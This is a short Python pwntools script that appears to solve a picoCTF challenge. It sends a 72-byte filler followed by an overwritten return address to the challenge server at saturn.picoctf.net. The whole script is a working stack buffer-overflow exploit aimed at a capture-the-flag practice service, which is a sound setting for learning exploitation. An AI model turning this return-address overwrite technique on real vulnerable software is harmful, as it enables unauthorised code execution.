#!/usr/bin/env python3
from pwn import *

jnk = b'\x41' * 72
rip = b'\x3b\x12\x40\x00\x00\x00' #b'\x42' * 6

payload = jnk + rip

c = remote('saturn.picoctf.net', 59482)
print(c.recvline())
c.sendline(payload)
print(c.recv())
c.close()
